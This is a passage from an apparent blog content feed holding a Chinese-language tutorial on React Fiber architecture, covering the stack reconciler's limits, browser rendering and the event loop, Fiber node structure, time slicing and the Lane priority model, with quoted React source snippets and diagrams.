class="hljs-comment">// &quot;操作取消&quot;</span><br><br><span class="hljs-comment">// 2秒后取消</span><br><span class="hljs-built_in">setTimeout</span>(cancel, <span class="hljs-number">2000</span>);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaScript</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaScript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>React Fiber 专题知识学习</title>
    <link href="/2025/06/05/React%20Fiber/"/>
    <url>/2025/06/05/React%20Fiber/</url>
    
    <content type="html"><![CDATA[<h1 id="第一章：React-Fiber-的诞生背景"><a href="#第一章：React-Fiber-的诞生背景" class="headerlink" title="第一章：React Fiber 的诞生背景"></a>第一章：React Fiber 的诞生背景</h1><h2 id="1-1-React15-及之前版本的渲染瓶颈"><a href="#1-1-React15-及之前版本的渲染瓶颈" class="headerlink" title="1.1 React15 及之前版本的渲染瓶颈"></a>1.1 React15 及之前版本的渲染瓶颈</h2><h3 id="递归不可中断的协调过程（stack-reconciler栈协调器）"><a href="#递归不可中断的协调过程（stack-reconciler栈协调器）" class="headerlink" title="递归不可中断的协调过程（stack reconciler栈协调器）"></a>递归不可中断的协调过程（stack reconciler栈协调器）</h3><p><strong>stack reconciler 是什么？</strong></p><p>stack reconciler 是 React15 及之前版本中使用的虚拟 dom 协调算法，负责计算组件树的变化并更新真实 dom。其核心特点是基于递归遍历、不可中断的同步更新流程。</p><p><strong>递归遍历虚拟 dom</strong></p><p>采用深度优先遍历策略（FDS），从组件树根节点开始，递归调用组件的 render 方法，生成完整的虚拟 dom 树。递归遍历依赖于 JavaScript 调用栈（call stack），一旦开始就必须执行到底，无法中途暂停。</p><p><strong>同步更新机制</strong></p><p>所有更新（比如 setState）都会立即触发完整的 diff 计算，无法合并和延迟。当一个应用的组件树过于庞大时，一次递归 diff 计算是十分耗时的。stack reconciler 的工作流程分为两个阶段：</p><ul><li>协调（reconciliation）：该阶段中采用递归 diff 算法，对比新旧虚拟 dom 树的差异，找到需要进行更新的树节点，标记需要更新的节点的增删改</li><li>提交（commit）：根据 diff 计算的结果，一次性同步执行所有的 dom 操作，并触发生命周期钩子（componentDidMount、componentDidUpdate等）</li></ul><p><strong>局限性</strong></p><p>在了解上述知识后，我们可以很清晰的感知到 stack reconciler 的局限性：</p><ul><li>无法中断长任务：递归遍历一旦开始就无法中断，这会占用 js 主线程，导致无法响应其他高优先级任务</li><li>缺乏任务优先级调度：所有的更新任务同步执行，享有同等优先级</li><li>内存泄漏风险：当组件树十分庞大时，深度递归可能会引起栈内存泄漏</li></ul><span id="more"></span><h3 id="大型应用中的掉帧问题和用户体验缺陷"><a href="#大型应用中的掉帧问题和用户体验缺陷" class="headerlink" title="大型应用中的掉帧问题和用户体验缺陷"></a>大型应用中的掉帧问题和用户体验缺陷</h3><p><strong>“帧”是什么？</strong></p><p>在计算机图形学与交互式应用中，帧是指屏幕画面的一次完整更新，它是衡量画面流畅度的核心单位，帧率（FPS）即是指每秒内渲染的帧数，人眼视觉对 60FPS 以上的变化感知有限，但低于 60FPS 时则会感知到延迟、卡顿。主流浏览器的帧率大多为 60FPS ，即每帧 16.67ms。</p><p><strong>什么是掉帧，掉帧是怎么引起的？</strong></p><p>掉帧即是指帧率未达预期，导致动画或交互卡顿。以浏览器举例，预期帧率 60FPS，则每一帧（16.67ms）的生命周期内，浏览器需要完成 js 执行、样式计算（style）、布局（layout）、绘制（paint）、合成（composite）等步骤，否则就会导致掉帧。</p><h2 id="1-2-浏览器渲染机制与主线程阻塞"><a href="#1-2-浏览器渲染机制与主线程阻塞" class="headerlink" title="1.2 浏览器渲染机制与主线程阻塞"></a>1.2 浏览器渲染机制与主线程阻塞</h2><h3 id="渲染机制"><a href="#渲染机制" class="headerlink" title="渲染机制"></a>渲染机制</h3><p>浏览器渲染过程是指浏览器将 HTML、CSS、JavaScript 等代码转换为用户可视界面的过程。浏览器通过多线程协作提高渲染效率，其中关键线程的分工如下：</p><table><thead><tr><th align="left">线程</th><th align="left">职责</th><th align="left">示例场景</th></tr></thead><tbody><tr><td align="left">主线程（Main Thread）</td><td align="left">运行 JavaScript、DOM&#x2F;CSS 解析、样式计算、布局、绘制、生成绘制指令</td><td align="left">setTimeout、React 渲染、事件处理</td></tr><tr><td align="left">合成器线程（Compositor Thread）</td><td align="left">接收绘制指令、图层分块光栅化、加速图层合成、提交 GPU 显示</td><td align="left">滚动、动画（如 transform 动画）</td></tr><tr><td align="left">光栅化线程（Raster Thread）</td><td align="left">将绘制指令转换为位图</td><td align="left">处理图片解码、图层分块光栅化</td></tr></tbody></table><p>正如上一章节所讲，浏览器渲染过程涉及多个阶段，且与主线程（Main Thread）紧密相关：</p><ol><li>解析阶段：解析 HTML （遇到<code>&lt;script&gt;</code>标签时会阻塞解析）和 CSS，生成 DOM 和 CSSOM</li><li>样式计算阶段：将 DOM 和 CSSOM 合并，生成渲染树，树仅包含可见节点，并计算节点的最终样式</li><li>布局阶段：根据渲染树计算每个节点的精确位置和大小</li><li>绘制阶段：生成绘制指令，将布局结果转换为屏幕上的像素，输出绘制列表，记录绘制顺序</li><li>合成阶段：将页面分为多个图层并启用 GPU 加速合成</li><li>显示阶段：将合成后的位图通过显卡驱动传递给屏幕显示</li></ol><p>浏览器的一次渲染过程即对应一帧的生成，单次渲染过程耗时过长即会导致帧率下降，即所谓的<code>掉帧</code>。结合浏览器关键线程分工职责和渲染过程的知识，可以知道，导致单次渲染耗时过长的原因有很多，与前端开发者息息相关的就是<code>主线程阻塞</code>。为了分析引起主线程阻塞的原因，我们还需要额外学习部分知识。</p><h3 id="事件循环"><a href="#事件循环" class="headerlink" title="事件循环"></a>事件循环</h3><p><strong>JavaScript 的事件循环是什么？</strong></p><p>JavaScript 的事件循环是其异步编程的核心机制，它决定了代码的执行顺序，使得单线程的 JavaScript 可以处理非阻塞任务</p><p><strong>核心组成</strong></p><p>事件循环的核心组成是<code>调用栈</code>和<code>任务队列</code>：</p><ul><li>调用栈：按顺序执行同步代码，后进先出（LIFO），执行一个函数时，将其压入栈顶，函数返回后弹出。如果栈溢出（比如深度递归）会抛出异常。</li><li>任务队列：存储待执行的异步回调，分为宏任务队列、微任务队列、其他队列（比如requestAnimationFrame、web workers）。</li></ul><p>调用栈与任务队列的协作模型的核心规则：</p><ul><li>同步代码属于当前宏任务，直接由调用栈执行</li><li>异步任务分为宏任务、微任务两类，每次事件循环只执行一个宏任务，微任务必须在当前宏任务结束后立即执行，且必须清空队列</li></ul><p><strong>工作流程&#x2F;执行顺序</strong></p><ol><li>执行当前调用栈中的同步代码（属于当前宏任务）</li><li>执行所有微任务，直到微任务队列为空</li><li>必要时渲染页面（浏览器决定）</li><li>从宏任务队列中取出一个任务执行（回到步骤 1）</li></ol><p><strong>核心规则</strong></p><p>同步代码 &gt; 微任务 &gt; 渲染 &gt; 宏任务</p><h3 id="布局抖动（Layout-Thrashing）"><a href="#布局抖动（Layout-Thrashing）" class="headerlink" title="布局抖动（Layout Thrashing）"></a>布局抖动（Layout Thrashing）</h3><p><strong>什么是布局抖动？</strong></p><p>布局是指浏览器计算渲染树中每个节点的几何信息（精确位置、大小）的过程，发生在样式计算之后、绘制之前。修改影响几何属性的 CSS（如 width、margin）或读取布局属性（如 offsetWidth）都会触发布局重排。</p><p>布局抖动是指浏览器因频繁的强制同步布局造成的性能问题，表现为多次不必要的布局计算（<code>重排/Reflow</code>），影响页面渲染速度。其本质是代码中混合连续读写布局属性，迫使浏览器多次重新计算布局</p><p><strong>常见触发场景</strong></p><ul><li>循环中读写布局属性</li><li>频繁访问布局 API：offsetTop、offsetLeft、scrollTop、getComputedStyle() 等</li><li>动画中混合读写</li></ul><h3 id="长任务（Long-Task）"><a href="#长任务（Long-Task）" class="headerlink" title="长任务（Long Task）"></a>长任务（Long Task）</h3><p><strong>什么是长任务？</strong></p><p>长任务是指主线程上连续执行时间超过 50ms 的 JavaScript 代码或渲染操作，它会阻塞用户交互和页面渲染，导致明显的卡顿</p><p><strong>长任务的标准</strong></p><ul><li>时间阈值：50ms，是由 Google 根据人类感知延迟提出的临界值</li><li>检测工具：Chrome DevTools 的 Performance 面板中，长任务会被标记为红色区块并显示 Long Task 警告</li></ul><p><strong>常见的长任务场景</strong></p><ul><li>复杂的 JavaScript 计算</li><li>未优化的 dom 操作</li><li>同步网络请求</li><li>加载未优化的三方脚本</li></ul><p><strong>长任务优化手段</strong></p><ul><li>任务拆分</li><li>web workers 多线程：将计算密集型任务转到worker</li><li>异步编程优化：通过 promise、async&#x2F;await 等手段避免阻塞</li><li>虚拟列表优化渲染：仅渲染可视区域内容</li><li>惰性加载：按需加载非关键脚本</li></ul><h3 id="主线程阻塞原因分析"><a href="#主线程阻塞原因分析" class="headerlink" title="主线程阻塞原因分析"></a>主线程阻塞原因分析</h3><p>现在，我们可以知道，引起主线程阻塞的主要原因有以下几点：</p><ul><li>布局抖动</li><li>长任务</li><li>过多的微任务</li></ul><h2 id="1-3-现代前端应用的需求演进"><a href="#1-3-现代前端应用的需求演进" class="headerlink" title="1.3 现代前端应用的需求演进"></a>1.3 现代前端应用的需求演进</h2><h3 id="动画-手势的高优先级更新"><a href="#动画-手势的高优先级更新" class="headerlink" title="动画&#x2F;手势的高优先级更新"></a>动画&#x2F;手势的高优先级更新</h3><p>在现代前端应用中，动画&#x2F;手势的高优先级更新是提升用户体验（UX）和界面流畅性的关键设计，其意义有以下几个方面：</p><ul><li>确保交互即时响应</li><li>避免掉帧现象的发生</li><li>提升手势操作的跟手性</li><li>支持复杂的 UI 设计：拖拽、捏合缩放、页面过渡动画等复杂交互依赖高优先级更新</li><li>与浏览器渲染管线的协同优化：高优先级动画（如 transform）可由合成器线程直接处理，无需主线程参与，从而避免布局&#x2F;重绘</li></ul><p>通过优先级调度策略，可以提升用户留存率和满意度。</p><h3 id="异步数据加载与Suspense的诉求"><a href="#异步数据加载与Suspense的诉求" class="headerlink" title="异步数据加载与Suspense的诉求"></a>异步数据加载与Suspense的诉求</h3><p>传统前端应用中，通常会遇到以下几大问题：</p><ul><li>“白屏”等待：传统应用在数据加载完全前，页面通常显示空白或 loading 图标，用户无法感知进度。</li><li>不必要的加载状态：传统模式下，各个组件独立维护 loading 状态，会导致多次闪烁的 loading 提示</li><li>竞态条件问题：典型场景是快速切换标签页时，前一次请求可能覆盖后一次请求的结果，比如从详情 A 跳到详情 B</li></ul><p>而现代前端应用中，这些问题是严重影响用户体验的，针对以上问题，衍生出了以下现代需求：</p><ul><li>骨架屏：在数据加载时显示占位 UI，提升感知速度</li><li>流式渲染：逐步发送 HTML 片段，让用户尽早看到内容</li><li>状态统一：统一管理数据状态，仅在所有数据就绪后一次性渲染</li><li>AbortController：可中断正在进行的异步操作，避免资源浪费和竞态条件</li></ul><p>这就要求应用在数据管理方案上能支持异步数据管理，因此 React 团队提出了Suspense 声明式异步数据管理方案。</p><p>为了解决 React15 及之前版本的渲染问题，应对日益激增的现代前端应用需求，React Fiber 架构于 16.x 版本诞生，并于后续版本中逐步优化完善。</p><h1 id="第二章：Fiber架构的核心设计思想"><a href="#第二章：Fiber架构的核心设计思想" class="headerlink" title="第二章：Fiber架构的核心设计思想"></a>第二章：Fiber架构的核心设计思想</h1><h2 id="2-1-Fiber-的三大角色定义"><a href="#2-1-Fiber-的三大角色定义" class="headerlink" title="2.1 Fiber 的三大角色定义"></a>2.1 Fiber 的三大角色定义</h2><h3 id="作为数据结构的Fiber节点（链表节点）"><a href="#作为数据结构的Fiber节点（链表节点）" class="headerlink" title="作为数据结构的Fiber节点（链表节点）"></a>作为数据结构的Fiber节点（链表节点）</h3><p>每个 Fiber 节点是一个 JavaScript 对象，React <a href="https://github.com/facebook/react/blob/1f5ce59dd7b6869b1a17ede65aa301002ef31d4b/packages/react-reconciler/src/ReactFiber.js#L134">源码</a>中对 Fiber 节点的定义如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">FiberNode</span>(<span class="hljs-params"></span><br><span class="hljs-params">  <span class="hljs-variable language_">this</span>: $FlowFixMe,</span><br><span class="hljs-params">  tag: WorkTag,</span><br><span class="hljs-params">  pendingProps: mixed,</span><br><span class="hljs-params">  key: <span class="hljs-literal">null</span> | string,</span><br><span class="hljs-params">  mode: TypeOfMode,</span><br><span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// Instance</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">tag</span> = tag;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">key</span> = key;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">elementType</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">stateNode</span> = <span class="hljs-literal">null</span>;<br><br>  <span class="hljs-comment">// Fiber</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">return</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">child</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">sibling</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">index</span> = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">ref</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">refCleanup</span> = <span class="hljs-literal">null</span>;<br><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">pendingProps</span> = pendingProps;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">memoizedProps</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">updateQueue</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">memoizedState</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">dependencies</span> = <span class="hljs-literal">null</span>;<br><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">mode</span> = mode;<br><br>  <span class="hljs-comment">// Effects</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">flags</span> = <span class="hljs-title class_">NoFlags</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">subtreeFlags</span> = <span class="hljs-title class_">NoFlags</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">deletions</span> = <span class="hljs-literal">null</span>;<br><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">lanes</span> = <span class="hljs-title class_">NoLanes</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">childLanes</span> = <span class="hljs-title class_">NoLanes</span>;<br><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">alternate</span> = <span class="hljs-literal">null</span>;<br><br>  <span class="hljs-keyword">if</span> (enableProfilerTimer) &#123;<br>    <span class="hljs-comment">// Note: The following is done to avoid a v8 performance cliff.</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// Initializing the fields below to smis and later updating them with</span><br>    <span class="hljs-comment">// double values will cause Fibers to end up having separate shapes.</span><br>    <span class="hljs-comment">// This behavior/bug has something to do with Object.preventExtension().</span><br>    <span class="hljs-comment">// Fortunately this only impacts DEV builds.</span><br>    <span class="hljs-comment">// Unfortunately it makes React unusably slow for some applications.</span><br>    <span class="hljs-comment">// To work around this, initialize the fields below with doubles.</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// Learn more about this here:</span><br>    <span class="hljs-comment">// https://github.com/facebook/react/issues/14365</span><br>    <span class="hljs-comment">// https://bugs.chromium.org/p/v8/issues/detail?id=8538</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">actualDuration</span> = <span class="hljs-title class_">Number</span>.<span class="hljs-property">NaN</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">actualStartTime</span> = <span class="hljs-title class_">Number</span>.<span class="hljs-property">NaN</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">selfBaseDuration</span> = <span class="hljs-title class_">Number</span>.<span class="hljs-property">NaN</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">treeBaseDuration</span> = <span class="hljs-title class_">Number</span>.<span class="hljs-property">NaN</span>;<br><br>    <span class="hljs-comment">// It&#x27;s okay to replace the initial doubles with smis after initialization.</span><br>    <span class="hljs-comment">// This won&#x27;t trigger the performance cliff mentioned above,</span><br>    <span class="hljs-comment">// and it simplifies other profiler code (including DevTools).</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">actualDuration</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">actualStartTime</span> = -<span class="hljs-number">1</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">selfBaseDuration</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">treeBaseDuration</span> = <span class="hljs-number">0</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (__DEV__) &#123;<br>    <span class="hljs-comment">// This isn&#x27;t directly used but is handy for debugging internals:</span><br><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_debugSource</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_debugOwner</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_debugNeedsRemount</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_debugHookTypes</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">if</span> (!hasBadMapPolyfill &amp;&amp; <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property">preventExtensions</span> === <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>      <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">preventExtensions</span>(<span class="hljs-variable language_">this</span>);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="作为执行单元的任务分片（Unit-of-Work）"><a href="#作为执行单元的任务分片（Unit-of-Work）" class="headerlink" title="作为执行单元的任务分片（Unit of Work）"></a>作为执行单元的任务分片（Unit of Work）</h3><p>在第一章节中，我们了解了长任务的相关知识，知道长任务会阻塞主线程，引起掉帧问题。为了解决这个问题，我们需要将长任务进行拆分，并在浏览器的每一帧中限制主线程执行任务的时间（React 默认初始时间是 <a href="https://github.com/facebook/react/blob/1fb18e22ae66fdb1dc127347e169e73948778e5a/packages/scheduler/src/forks/SchedulerHostConfig.default.js#L119">5ms</a>），这种将长任务拆成多段微小任务的技术被称为<code>任务分片</code>，分配到每一帧中去执行的操作被称为<code>时间切片</code>，二者协同实现 React 的高效渲染。</p><p>实现任务分片的关键是将同步更新变为可中断的异步更新：</p><ol><li>构建链表树：通过 Fiber 节点的链表结构构建链表树，替代递归调用栈</li><li>分片执行：React 通过循环逐个处理 Fiber 节点，每处理完一个节点后检查剩余时间，决定继续还是暂停</li><li>中断和恢复：当有高优先级任务（如用户点击）或当前分片时间用尽时暂停任务，通过保存当前处理的 Fiber 节点指针，下次从断点继续</li></ol><h3 id="作为调度单位的优先级载体（Lane模型）"><a href="#作为调度单位的优先级载体（Lane模型）" class="headerlink" title="作为调度单位的优先级载体（Lane模型）"></a>作为调度单位的优先级载体（Lane模型）</h3><p>React Fiber 架构中实现任务优先级调度的核心思想是：将优先级信息分散在 Fiber 树的各个节点和更新信息中，通过动态计算（lanes）和调度器（scheduler）的协作实现优先级调度。</p><p><strong>Lane（车道）的定义</strong></p><ul><li>每个 Lane 是一个32位的二进制位</li><li>每个二进制位代表一种优先级类型</li><li>数字越小（位越低）优先级越高</li><li>Lane 互斥</li></ul><p><strong>Lane 的类型</strong></p><p>React 18 版本中定义的类型有以下几种：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 优先级从高到低</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">SyncLane</span>: <span class="hljs-title class_">Lane</span> = <span class="hljs-number">0b0000000000000000000000000000001</span>; <span class="hljs-comment">// 同步任务（最高）</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">InputContinuousLane</span>: <span class="hljs-title class_">Lane</span> = <span class="hljs-number">0b0000000000000000000000000000100</span>; <span class="hljs-comment">// 用户输入</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">DefaultLane</span>: <span class="hljs-title class_">Lane</span> = <span class="hljs-number">0b0000000000000000000000000100000</span>; <span class="hljs-comment">// 默认更新</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">TransitionLane</span>: <span class="hljs-title class_">Lane</span> = <span class="hljs-number">0b0000000000000000001000000000000</span>; <span class="hljs-comment">// 过渡更新，比如useTransition</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">IdleLane</span>: <span class="hljs-title class_">Lane</span> = <span class="hljs-number">0b0100000000000000000000000000000</span>; <span class="hljs-comment">// 空闲任务（最低）</span><br></code></pre></td></tr></table></figure><p><strong>Lane 集合（Lanes）</strong></p><p>多个 Lane 可以组合：<code>lanes = InputLane | DefaultLane</code>，表示一组需要处理的优先级集合</p><p><strong>Lane 模型的工作原理</strong></p><ol><li>优先级分配：更新阶段根据交互类型分配 Lane</li><li>优先级收集：每个 Fiber 节点对象都有 <code>lanes</code> 属性和 <code>childLanes</code> 属性，lanes 属性保存该节点需要处理的优先级合集，childLanes 属性保存子节点中所有未处理的优先级合集</li><li>优先级调度：Fiber 树根节点合并所有子节点的 lanes 和 childLanes -&gt; 从合并后的优先级合集中选取最高优先级的 Lane 进行处理 -&gt; 只处理与选定 Lane 匹配的更新</li></ol><p>这里先只做简单的概念了解，详细知识将在 4.1 章节中进行讲解。</p><h2 id="2-2-关键设计目标"><a href="#2-2-关键设计目标" class="headerlink" title="2.2 关键设计目标"></a>2.2 关键设计目标</h2><p>我们已经知道在 React15 及之前版本中，渲染一旦开始便无法中断，并且所有任务同步进行，享有同等优先级，会导致交互延迟。Fiber 架构为了解决这些问题的核心设计目标有三个</p><h3 id="可中断、可恢复的渲染流程"><a href="#可中断、可恢复的渲染流程" class="headerlink" title="可中断、可恢复的渲染流程"></a>可中断、可恢复的渲染流程</h3><p><strong>关键设计</strong></p><p>要实现可中断、可恢复的渲染流程，关键设计有三点：</p><ul><li>链表结构替代递归结构：Fiber 通过 <code>child、sibling、return</code>构成树形链表</li><li>全局指针跟踪进度：<code>nextUnitOfWork</code>记录当前处理节点</li><li>双缓存机制：<code>current tree</code> 和 <code>work-in-progress tree</code> 两棵树交替更新</li></ul><p><strong>完整流程</strong></p><pre class="mermaid">graph TD    A[触发更新] --> B{有高优先级任务}    B -->|是| C[中断当前任务]    B -->|否| D[开始Render阶段]    D --> E[处理Fiber节点]    E --> F{时间用完}    F -->|是| C    F -->|否| G{还有子节点}    G -->|是| H[移动到子节点]    G -->|否| I{还有兄弟节点}    I -->|是| J[移动到兄弟节点]    I -->|否| K[回溯到父节点]    K --> L{根节点}    L -->|否| E    L -->|是| M[完成Render阶段]    M --> N[Commit阶段]    N --> O[更新DOM]    C --> P[保存进度]    P --> Q[执行高优先级任务]    Q --> R[恢复低优先级任务]</pre><p><strong>实现原理</strong></p><ol><li>渲染阶段可中断，核心代码如下：</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">let</span> nextUnitOfWork = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 全局工作指针</span><br><br><span class="hljs-comment">// 主工作循环</span><br><br><span class="hljs-comment">/** <span class="hljs-doctag">@noinline</span> */</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">workLoopConcurrentByScheduler</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// Perform work until Scheduler asks us to yield</span><br>  <span class="hljs-keyword">while</span> (workInProgress !== <span class="hljs-literal">null</span> &amp;&amp; !<span class="hljs-title function_">shouldYield</span>()) &#123;<br>    <span class="hljs-comment">// $FlowFixMe[incompatible-call] flow doesn&#x27;t know that shouldYield() is side-effect free</span><br>    <span class="hljs-title function_">performUnitOfWork</span>(workInProgress);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 检查是否需要中断</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">shouldYield</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> deadline.<span class="hljs-title function_">timeRemaining</span>() &lt; <span class="hljs-number">1</span> || <br>         <span class="hljs-title function_">hasHigherPriorityWork</span>(); <span class="hljs-comment">// 高优先级任务到达</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>进度保存和恢复：中断时保留 <code>nextUnitOfWork</code> 指针指向未完成的 Fiber 节点，恢复时从上次中断的节点继续遍历，采用深度优先遍历策略，优先处理子节点（<code>child</code>），无子节点时处理兄弟节点（<code>sibling</code>），无兄弟节点时回溯父节点（<code>return</code>）</li><li>双缓存保证一致性：current tree 展示当前界面，中断时保持不变，work-in-progress tree 构建新的 Fiber 树，构建完成后一次性替换 current tree 变成新的 current tree</li></ol><p>React Fiber 架构通过可中断、可恢复的渲染流程拥有类似于操作系统的“多任务处理”能力，最终实现渲染不阻塞交互的用户体验</p><h3 id="时间切片（Time-Slicing）与增量渲染"><a href="#时间切片（Time-Slicing）与增量渲染" class="headerlink" title="时间切片（Time Slicing）与增量渲染"></a>时间切片（Time Slicing）与增量渲染</h3><p>在 React Fiber 中，时间切片和增量渲染是两个紧密相关的核心概念，共同解决了渲染过程中主线程阻塞的问题，但他们的关注点不同</p><p><strong>时间切片 - 时间维度的解决方案</strong></p><p>时间切片是将连续长任务切割成多个微小任务，并分散在浏览器的多个渲染帧中去执行的技术</p><p>它的核心目标有 2 个：</p><ul><li>防止 JavaScript 代码执行时间超过 50ms</li><li>保证浏览器的每一帧中有足够的时间去执行渲染、动画和交互</li></ul><p>其核心实现原理是通过 <code>requestIdleCallback</code>（React17及以下） 或 <code>MessageChannel</code>（React18） 来检测剩余时间，当时间用尽时中断任务并保存状态，下次空余时间到来时从中断点恢复</p><p><strong>增量渲染 - 任务维度的解决方案</strong></p><p>增量渲染是将整个渲染过程分解为多个可独立执行的子任务，并按优先级逐步完成的技术</p><p>它的核心目标是：</p><ul><li>将大型渲染任务分解为可独立执行的小任务</li><li>允许先呈现部分内容，再逐步补充剩余内容</li></ul><p>其实现原理是通过任务分片将组件树拆分为 Fiber 节点链表，通过 Lane 模型区分任务优先级，完成的部分先提交呈现，并结合双缓存机制保证渲染过程不影响当前显示：</p><pre class="mermaid">graph LRA[开始渲染] --> B[处理根节点]B --> C[处理子节点1]C --> D[处理子节点1.1]D --> E[提交已完成部分]E --> F[处理兄弟节点1.2]F --> G{时间用尽}G -->|是| H[保存状态并暂停]G -->|否| 